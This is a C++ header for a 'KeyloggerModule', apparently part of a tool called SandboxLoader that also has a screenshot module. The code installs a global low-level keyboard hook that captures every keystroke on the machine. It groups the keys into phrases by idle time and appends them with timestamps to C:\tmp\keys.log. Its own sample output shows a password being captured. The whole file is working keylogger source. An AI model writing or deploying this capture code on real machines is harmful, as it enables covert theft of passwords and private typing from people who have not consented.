#pragma once

#include <fstream>
#include <iostream>
#include <string>
#include <chrono>
#include <sstream>
#include <iomanip>
#include <ctime>


#include "SandboxLoader/Modules/IModule.h"

// ─────────────────────────────────────────────────────────────────────────────
// KeyloggerModule
//
// Installs WH_KEYBOARD_LL and groups keystrokes into "phrases" using an
// idle timeout.  Instead of writing every key immediately, keys are buffered
// and only flushed to disk when the user stops typing for IDLE_MS milliseconds.
//
// OUTPUT FORMAT (C:\tmp\keys.log)
// ────────────────────────────────
//   [2026-06-13 10:42:31] hello there
//   [2026-06-13 10:42:45] www.google.com[ENTER]
//   [2026-06-13 10:43:02] my passw[BACKSPACE][BACKSPACE]secret
//
// IDLE DETECTION MECHANISM
// ─────────────────────────
// Every keystroke calls SetTimer(hwnd, IDLE_TIMER_ID, IDLE_MS, nullptr).
// SetTimer on an existing timer ID *resets* it — so the timer only fires
// when no key has been pressed for a full IDLE_MS window.
// When WM_TIMER fires → FlushBuffer() writes the accumulated phrase + timestamp.
//
// This means:
//   • Fast typing → timer keeps getting reset → nothing written yet
//   • User pauses / switches app → timer fires → phrase written as one line
//   • Each line in the log represents one burst of related typing
// ─────────────────────────────────────────────────────────────────────────────

class KeyloggerModule : public IModule
{
public:
    // idleMs – silence window before a phrase is flushed (default: 2000ms)
    explicit KeyloggerModule(UINT idleMs = 2000)
        : m_idleMs(idleMs)
    {}

    std::wstring Name() const override { return L"KeyloggerModule"; }

    // ── Lifecycle ─────────────────────────────────────────────────────────────

    void OnCreate(HWND hwnd) override
    {
        s_instance = this;
        m_hwnd = hwnd;

        m_hook = ::SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
        if (!m_hook)
            std::cerr << "[KeyloggerModule] SetWindowsHookEx failed, GLE="
            << ::GetLastError() << "\n";
        else
            std::wcout << L"[KeyloggerModule] Hook installed, idle timeout="
            << m_idleMs << L"ms\n";
    }

    bool OnMessage(HWND /*hwnd*/, UINT uMsg, WPARAM wParam, LPARAM /*lParam*/) override
    {
        // The idle timer fires here when the user stops typing
        if (uMsg == WM_TIMER && wParam == IDLE_TIMER_ID)
        {
            FlushBuffer();
            return true;
        }
        return false;
    }

    void OnDestroy(HWND hwnd) override
    {
        // Flush anything still in the buffer before shutting down
        if (!m_buffer.empty())
            FlushBuffer();

        ::KillTimer(hwnd, IDLE_TIMER_ID);

        if (m_hook)
        {
            ::UnhookWindowsHookEx(m_hook);
            m_hook = nullptr;
        }
        s_instance = nullptr;
    }

private:
    static constexpr UINT_PTR IDLE_TIMER_ID = 2001; // unique, won't clash with ScreenshotModule

    HHOOK    m_hook = nullptr;
    HWND     m_hwnd = nullptr;
    UINT     m_idleMs;

    std::wstring m_buffer;           // accumulates keystrokes between idle flushes
    SYSTEMTIME   m_phraseStart{};    // wall-clock time of the first key in this phrase

    static KeyloggerModule* s_instance;

    // ── Hook callback (runs on the message-loop thread) ───────────────────────
    static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
    {
        if (nCode == HC_ACTION && s_instance)
        {
            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
            {
                auto* kb = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
                s_instance->OnKey(kb->vkCode);
            }
        }
        return ::CallNextHookEx(nullptr, nCode, wParam, lParam);
    }

    // ── Called for every key-down ─────────────────────────────────────────────
    void OnKey(DWORD vk)
    {
        // Record the timestamp of the very first key in a new phrase
        if (m_buffer.empty())
            ::GetLocalTime(&m_phraseStart);

        // Append the translated key to the in-memory buffer
        m_buffer += VkToLabel(vk);

        // (Re-)start the idle timer.
        // Calling SetTimer with an existing ID resets the countdown — this is
        // the core of the idle detection: the timer only fires after a full
        // IDLE_MS of silence.
        ::SetTimer(m_hwnd, IDLE_TIMER_ID, m_idleMs, nullptr);
    }

    // ── Flush accumulated phrase to disk ──────────────────────────────────────
    void FlushBuffer()
    {
        ::KillTimer(m_hwnd, IDLE_TIMER_ID);

        if (m_buffer.empty())
            return;

        // Format: [YYYY-MM-DD HH:MM:SS] <phrase>
        wchar_t ts[32];
        swprintf_s(ts, L"[%04d-%02d-%02d %02d:%02d:%02d]",
            m_phraseStart.wYear, m_phraseStart.wMonth, m_phraseStart.wDay,
            m_phraseStart.wHour, m_phraseStart.wMinute, m_phraseStart.wSecond);

        std::wofstream file{ LR"(C:\tmp\keys.log)", std::ios_base::app };
        file << ts << L" " << m_buffer << L"\n";

        std::wcout << L"[KeyloggerModule] Flushed phrase: " << ts
            << L" (" << m_buffer.size() << L" chars)\n";

        m_buffer.clear();
    }

    // ── VK → human-readable label ─────────────────────────────────────────────
    // Printable characters are resolved via ToUnicode so we correctly handle
    // shifted keys, international layouts, etc.
    static std::wstring VkToLabel(DWORD vk)
    {
        BYTE keyState[256] = {};
        ::GetKeyboardState(keyState);

        wchar_t buf[8] = {};
        int r = ::ToUnicode(vk, ::MapVirtualKeyW(vk, MAPVK_VK_TO_VSC),
            keyState, buf, 7, 0);
        if (r == 1 && buf[0] >= L' ')
            return std::wstring(1, buf[0]);

        switch (vk)
        {
        case VK_RETURN:   return L"[ENTER]\n"; // newline makes log more readable
        case VK_BACK:     return L"[BS]";       // short so it's readable inline
        case VK_TAB:      return L"[TAB]";
        case VK_ESCAPE:   return L"[ESC]";
        case VK_SPACE:    return L" ";
        case VK_DELETE:   return L"[DEL]";
        case VK_LEFT:     return L"[←]";
        case VK_RIGHT:    return L"[→]";
        case VK_UP:       return L"[↑]";
        case VK_DOWN:     return L"[↓]";
            // Modifier keys: record them but keep them short
        case VK_LSHIFT:
        case VK_RSHIFT:
        case VK_SHIFT:    return L"";           // shift is implied by the char case
        case VK_LCONTROL:
        case VK_RCONTROL:
        case VK_CONTROL:  return L"[^]";
        case VK_LMENU:
        case VK_RMENU:
        case VK_MENU:     return L"[ALT]";
        case VK_CAPITAL:  return L"[CAPS]";
        default:
        {
            wchar_t fb[16];
            swprintf_s(fb, L"[VK%lu]", vk);
            return fb;
        }
        }
    }
};

inline KeyloggerModule* KeyloggerModule::s_instance = nullptr;